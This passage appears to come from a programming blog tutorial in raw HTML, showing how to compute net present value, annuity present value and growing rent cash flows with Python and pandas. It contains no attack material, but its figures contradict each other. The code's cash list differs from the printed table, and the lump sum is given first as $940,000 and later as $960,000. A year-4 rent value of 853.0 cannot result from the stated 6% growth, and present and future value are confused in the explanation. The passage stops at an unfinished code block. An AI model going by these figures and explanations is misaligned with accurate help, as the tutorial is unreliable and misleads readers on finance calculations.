&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pandas&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;pd&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;numpy&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;matplotlib.pyplot&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;plt&lt;/span&gt;

&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mf"&gt;0.03&lt;/span&gt;
&lt;span class="n"&gt;cash_flow&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pd&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DataFrame&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s"&gt;'Year'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
  &lt;span class="s"&gt;'Cash'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;]})&lt;/span&gt;
&lt;span class="c1"&gt;# PV (Present Value) = Cash (at period 1) / (1 + r)^n
&lt;/span&gt;&lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'PV'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'Cash'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;1.0&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'Year'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;npv&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'PV'&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;round&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Year&lt;/th&gt;
&lt;th&gt;Cash&lt;/th&gt;
&lt;th&gt;PV&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;194.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;189.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;183.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;178.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;173.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;td&gt;167.0&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;




&lt;p&gt;The earned $ in the future will not be worth as much as one made in the present—this discount rate element of NPV (Net Present Value)–the difference between the present value of cash and PV (Present Value) over a period of time.&lt;/p&gt;

&lt;p&gt;According to your expectation, in 6 years, you will get $1200, but their worth (NPV) at that time would be:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'NPV is'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;round&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;npv&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="c1"&gt;# NPV is 1083.0
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;As you see, $1200 in the present is $1083 in the six years with the discount (inflation rate in our case) of 3%.&lt;/p&gt;

&lt;p&gt;We can also use the same approach to &lt;strong&gt;calculate the NPV of uneven cash flows yearly,&lt;/strong&gt; receiving different cash amounts with the same discount (inflation) rate of 3%:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="c1"&gt;# Calculate NPV of uneven cash flows
&lt;/span&gt;
&lt;span class="n"&gt;cash_flow&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pd&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DataFrame&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s"&gt;'Year'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
  &lt;span class="s"&gt;'Cash'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;150&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;250&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;350&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;400&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;450&lt;/span&gt;&lt;span class="p"&gt;]})&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;#&lt;/th&gt;
&lt;th&gt;Year&lt;/th&gt;
&lt;th&gt;Cash&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;150&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;200&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;250&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;300&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;350&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;400&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;




&lt;p&gt;Looking at the table, you are expecting to get $1800 in total in the six years. You are right, you will have this amount, but with the worth of:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mf"&gt;0.03&lt;/span&gt;
&lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'PV'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'Cash'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'Year'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;npv&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'PV'&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'NPV is'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;round&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;npv&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="c1"&gt;# NPV is 1596.0
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Yes, your present $1800 will be $1596 in the near future of 6 years.&lt;/p&gt;




&lt;p&gt;Let's consider other hands-on examples of the time-value of money:&lt;/p&gt;

&lt;p&gt;Often we have to calculate &lt;strong&gt;the present value of equal payments during determined X years.&lt;/strong&gt; A good example is a lottery jackpot––$1,000,000 payout. Usually, there are two options for how the winner can receive his money:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Receive five equal payments of $200,000 during the next five years&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;The lump sum of $940000 (because of 6% of the bank interest rate on the deposit)&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;At first glance, nobody wants to lose $60000 and would prefer to wait these years while receiving $200,000 yearly till the end of the payout period. After all, $1,000,000 is more than $940,000.&lt;/p&gt;

&lt;p&gt;Precisely, we need to think of calculating the net present value to make the right decision. In the financial terminology, it would be called: calculating &lt;a href="https://financeformulas.net/Present_Value_of_Annuity.html"&gt;the present value of a finite annuity.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Let's see how much worth would be getting your $1,000,000 through 5 equal payments of $200,000 and five years from now with the bank interest rate on deposit of 6%:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="n"&gt;payment&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;200000&lt;/span&gt;
&lt;span class="n"&gt;time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;
&lt;span class="n"&gt;rate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mf"&gt;0.06&lt;/span&gt;
&lt;span class="n"&gt;cash_flow&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pd&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DataFrame&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s"&gt;'Period'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;arange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
 &lt;span class="s"&gt;'PMT'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;payment&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;#&lt;/th&gt;
&lt;th&gt;Period&lt;/th&gt;
&lt;th&gt;PMT&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;200000&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;200000&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;200000&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;200000&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;200000&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;




&lt;p&gt;So far, we have created a &lt;em&gt;cash_flow&lt;/em&gt; table as we did in the previous tables above to preview the cash flow better.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'PV'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'PMT'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;rate&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'Period'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;npv&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'PV'&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'NPV is '&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;round&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;npv&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="c1"&gt;# NPV is 865895.0
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;$865,895 is the net present value of five equal payments and less than $960,000 offered. Therefore, it's better to take the lump sum payment of $960,000 and deposit it in the bank once.&lt;/p&gt;

&lt;p&gt;As I mentioned before, in the finance world, the last calculation called: &lt;strong&gt;the present value of a finite annuity,&lt;/strong&gt; the more advanced and often applicable concept to investors, especially to real estate investors, is the calculation of &lt;a href="https://financeformulas.net/Present_Value_of_Growing_Annuity.html"&gt;the present value of the finite growing annuity&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;And here is an excellent example to consider for that:&lt;/p&gt;

&lt;p&gt;Let's suppose you own a complex building with apartments. In your case, it means that the tenants pay you fixed rent monthly. To tackle higher inflation, you decide to increase the rent. Basically, the whole building from the finance side looks like an annuity payment that grows at the inflation rate. So that allows us to calculate the present value of those payments now:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Current rent payment is $800&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Growth rate of payments 6%&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Inflation rate of 3%&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Period is 5 years&lt;br&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="n"&gt;rent_payment&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;800&lt;/span&gt;
&lt;span class="n"&gt;time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;
&lt;span class="n"&gt;rent_growth&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mf"&gt;0.06&lt;/span&gt;
&lt;span class="n"&gt;inflation_rate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mf"&gt;0.03&lt;/span&gt;
&lt;span class="n"&gt;cash_flow&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pd&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DataFrame&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s"&gt;'Year'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;arange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
  &lt;span class="s"&gt;'Cash'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;rent_payment&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;#&lt;/th&gt;
&lt;th&gt;Year&lt;/th&gt;
&lt;th&gt;Cash&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;800&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;800&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;800&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;800&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;800&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;




&lt;p&gt;The next step is to increase cash flow at the growth rate to beat the inflation:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'Cash'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;rent_payment&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;rent_growth&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'Year'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;round&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;#&lt;/th&gt;
&lt;th&gt;Year&lt;/th&gt;
&lt;th&gt;Cash&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;800.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;848.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;899.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;853.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;1010.0&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;




&lt;p&gt;After increasing the rent payment, we need to calculate the present value of cash flow yearly by considering the inflation rate of 3%:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
